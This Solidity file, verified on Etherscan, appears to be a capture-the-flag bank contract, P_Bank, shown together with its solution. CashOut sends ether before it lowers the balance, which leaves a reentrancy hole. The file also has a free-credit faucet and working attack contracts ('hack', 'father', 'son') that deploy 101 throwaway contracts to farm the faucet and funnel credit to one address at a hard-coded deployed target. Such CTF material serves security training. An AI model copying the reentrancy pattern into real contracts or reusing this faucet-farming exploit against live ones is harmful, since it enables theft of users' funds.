/**
 *Submitted for verification at Etherscan.io on 2019-10-08
*/

pragma solidity ^0.4.24;

contract P_Bank
{
    mapping (address => uint) public balances;
    
    uint public MinDeposit = 0.1 ether;
    
    Log TransferLog;

    event FLAG(string b64email, string slogan);
    


    constructor(address _log) public { 
        TransferLog = Log(_log);
     }

    function Ap() public {
        if(balances[msg.sender] == 0) {
            balances[msg.sender]+=1 ether;
        }
    }

    function Transfer(address to, uint val) public {
        if(val > balances[msg.sender]) {
            revert();
        }
        balances[to]+=val;
        balances[msg.sender]-=val;
    }

    function CaptureTheFlag(string b64email) public returns(bool){
      require (balances[msg.sender] > 500 ether);
      emit FLAG(b64email, "Congratulations to capture the flag!");
    }

    
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+= msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am) public 
    {
        if(_am<=balances[msg.sender])
        {
            
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}

contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    string err = "CashOut";
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

contract hack {
    address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21;
    P_Bank target = P_Bank(instance_address);
    
    function hack1(string b64email) public {
        target.CaptureTheFlag(b64email);
    }
}

contract father {
    function createsons() {
        for (uint i=0;i<101;i++)
        {
            son ason = new son();
        }
    }
}

contract son {
    constructor() public {
        P_Bank tmp = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);
        tmp.Ap();
        tmp.Transfer(0x7ec9f720a8d59bc202490c690139f8c7cbad568d, 1 ether);
    }
}
